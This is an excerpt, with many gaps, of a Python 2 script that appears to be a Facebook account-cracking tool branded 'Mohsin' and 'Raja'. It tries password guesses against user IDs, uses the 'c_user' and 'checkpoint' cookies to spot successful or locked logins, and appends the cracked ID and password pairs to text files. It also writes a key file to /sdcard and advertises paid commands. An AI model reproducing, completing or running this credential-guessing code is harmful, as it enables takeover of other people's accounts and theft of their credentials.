...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/.mohsinali.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        ...
        kok = open('/sdcard/.mohsinali.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member Of The Mohsin Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[MOHSIN-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[MOHSIN-CP] ' + coc + user + ' | ' + pass1
...
def mineExt():
    ...
    print g + '[=] Extracting From The Mohsin : ' + my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass2
                    ok = open('RAJA-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass2
                    cp = open('RAJA-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass3
                        ok = open('RAJA-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass3
                        cp = open('RAJA-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass4
                            ok = open('RAJA-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass4
                            cp = open('RAJA-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass5
                                ok = open('RAJA-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass5
                                cp = open('RAJA-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass1
                cp = open('Raja-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[MOHSIN-OK] ' + uid + ' | ' + pass6
                                    ok = open('Mohsin-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[MOHSIN-CP] ' + uid + ' | ' + pass6
                                    cp = open('mohsin-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
